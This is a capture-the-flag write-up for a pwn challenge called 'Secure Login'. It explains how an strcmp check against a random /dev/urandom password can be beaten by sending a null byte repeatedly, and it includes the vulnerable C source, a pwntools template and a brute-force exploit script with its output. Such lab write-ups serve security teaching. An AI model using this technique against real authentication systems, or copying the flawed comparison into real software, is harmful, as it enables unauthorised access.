# Secure Login (pwn)

This is the first challenge in the pwn section for this CTF. I am demoing all these locally, so you will also need to create your own ```flag.txt``` file to test it. When you are ready to run it against the server, you can run:

``` Bash
$ python exploit.py REMOTE <ip> <port>
```

We see that we get the binary along with the source code which will be helpful. After downloading them, lets check out the binary.

``` Bash
$ file login
login: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=53746c296e5ec588ae359cc09eca0938328c0687, for GNU/Linux 4.4.0, not stripped

$ checksec --file=login
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   52 Symbols        No    0               2               login
```

Here, we see that this is a 64-bit binary with a stack canary enabled and the stack is marked as non-executable. This tells us that we probably won't be doing a buffer overflow or injecting shellcode.

Lets run the binary and see what we can figure out:

``` Bash
Welcome to my ultra secure login service!
Enter the password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wrong!
```

This tells us that we wont be able to do any type of buffer overflow since we arent able to cause a seg fault. Lets run ```ltrace``` to see if we can find anything:

``` Bash
$ ltrace ./login
puts("Welcome to my ultra secure login"...Welcome to my ultra secure login service!
)                                                              = 42
fopen("/dev/urandom", "r")                                                                               = 0x13a76b0
fgets("XN\332\307\214^\210\201\036\365\003\2343\r\b,\253\n", 128, 0x13a76b0)                             = 0x4040a0
fclose(0x13a76b0)                                                                                        = 0
printf("Enter the password: ")                                                                           = 20
fgets(Enter the password: hello
"hello\n", 128, 0x7fa2f662ba80)                                                                    = 0x7ffd469d0cf0
strcmp("hello\n", "XN\332\307\214^\210\201\036\365\003\2343\r\b,\253\n")                                 = 16
puts("Wrong!"Wrong!
)                                                                                           = 7
+++ exited (status 0) +++
```

If you are unfamiliar, ```ltrace``` will follow our input through the binary and show us what is happening with it. We see that we are promted for the input and then it is compared using ```strcmp()``` against some random bytes that it got from ```/dev/urandom```. Lets look at the source code:

``` C
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```
Here, we can see that the code is getting 128 random bytes from our ```/dev/urandom``` and checking our input against those. This means that for each of the 128 bytes, there are 256 possibile bytes that can be chosen, making it extremely difficult to guess the password.

However, of those 256 possible bytes, there is the null character byte (```0x00```). This serves as a string terminator in C. Whenever this is seen in C, it tells us that the string has ended and to stop operations on it.

This means that if the random string contains this byte in it, everything after it will be not be considered in the ```strcmp()```. Knowing this, along with the fact that there are 256 possible bytes, we can brute force this program's login service. If we run the program enough times, eventually the first byte in the password string will be this null byte which means we can just enter that null byte as our password.

Lets write out a python script to run this program 1000 times:

``` Python3
from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # (./exe < payload REMOTE ip port)
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
        

# This is for finding the offset automatically, does not work if the binary is owned by root and youre not root
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  #32-bit
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  #64-bit
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './login'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
```
This part of the exploit is a standard template that I use for just about all my binary exploit scripts. Below those comments, we'll write out our specific exploit:

``` Python
for i in range(1000):
    io = start()
    io.recv()
    # Try to login with null byte
    io.sendline(b"\x00")
    io.recvuntil(': ')
    response = io.recv()
    # Did we get the flag?
    if(not b'Wrong!' in response):
        print(response)
    io.close()
```
We want to run this program 1000 times so we start with a loop for that amount. Inside the loop, we start the program and recieve any output from it. 

After that, we send in our null byte as our password and recieve the program output and store it in ```response```. We only want to print out the response if it contains our flag so we check to make sure that the response does not contain 'Wrong!'. Lastly, we close the program and try it again.

Lets run this and see what we get:

``` Bash
$ python exploit.py
  io.recvuntil(': ')
b'flag{you_got_it}\n'
b'flag{you_got_it}\n\n'
b'flag{you_got_it}\n\n'
b'flag{you_got_it}\n\n'
b'flag{you_got_it}\n\n'
b'flag{you_got_it}\n\n'
b'flag{you_got_it}\n\n'
```
We can see that for this particular time, out of 1000 runs, 7 of them had the null byte as the first byte in the password string and we got our flag!
